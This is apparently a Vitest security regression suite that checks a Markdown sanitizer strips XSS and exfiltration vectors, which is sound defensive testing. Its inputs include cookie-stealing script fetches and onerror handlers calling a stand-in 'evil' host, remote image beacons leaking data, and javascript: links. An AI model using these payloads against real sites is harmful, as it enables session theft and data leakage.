// @vitest-environment jsdom
import { describe, it, expect } from 'vitest';
import { renderMarkdownSafe, sanitizeHtmlFragment } from '../src/lib/sanitizeHtml';

/**
 * Security regression tests for the render sanitizer. The app renders
 * user-supplied (adversarial) Markdown to the DOM; these assert the known
 * self-XSS / exfil-beacon vectors are neutralized before that happens.
 * Runs under jsdom because DOMPurify requires a DOM.
 */
describe('renderMarkdownSafe — XSS / exfil neutralization', () => {
  it('strips <script> tags', () => {
    const out = renderMarkdownSafe('hello <script>fetch("https://evil/"+document.cookie)</script> world');
    expect(out).not.toContain('<script');
    expect(out.toLowerCase()).not.toContain('fetch(');
  });

  it('strips inline event handlers (onerror/onload)', () => {
    const out = renderMarkdownSafe('<img src=x onerror="fetch(\'https://evil/leak\')">');
    expect(out.toLowerCase()).not.toContain('onerror');
  });

  it('neutralizes remote image beacons (the THR-MD-URL-EXFIL pattern in our own preview)', () => {
    const out = renderMarkdownSafe('![leak](https://evil.example/beacon?data=secret)');
    // The remote src must be stripped so rendering it triggers no outbound request.
    expect(out).not.toContain('https://evil.example');
  });

  it('neutralizes a raw <img> with a remote src', () => {
    const out = renderMarkdownSafe('<img src="https://evil.example/track.gif">');
    expect(out).not.toContain('https://evil.example');
  });

  it('strips javascript: URIs on links', () => {
    const out = renderMarkdownSafe('[click](javascript:alert(document.domain))');
    expect(out.toLowerCase()).not.toContain('javascript:');
  });

  it('forbids <iframe>, <object>, <form>', () => {
    const out = renderMarkdownSafe('<iframe src="https://evil"></iframe><object data="x"></object><form action="https://evil"></form>');
    expect(out.toLowerCase()).not.toContain('<iframe');
    expect(out.toLowerCase()).not.toContain('<object');
    expect(out.toLowerCase()).not.toContain('<form');
  });

  it('preserves legitimate formatting (bold, headings, lists, links keep their text)', () => {
    const out = renderMarkdownSafe('# Title\n\nThis is **bold** and a [safe link](https://example.com).\n\n- item one\n- item two');
    expect(out).toContain('<strong>bold</strong>');
    expect(out).toMatch(/<h1[^>]*>Title<\/h1>/);
    expect(out).toContain('<li>item one</li>');
    expect(out).toContain('safe link');
  });

  it('sanitizeHtmlFragment neutralizes a pre-built malicious fragment (HTML export path)', () => {
    const out = sanitizeHtmlFragment('<p>ok</p><img src="https://evil/beacon"><script>bad()</script>');
    expect(out).toContain('<p>ok</p>');
    expect(out).not.toContain('https://evil');
    expect(out.toLowerCase()).not.toContain('<script');
  });
});
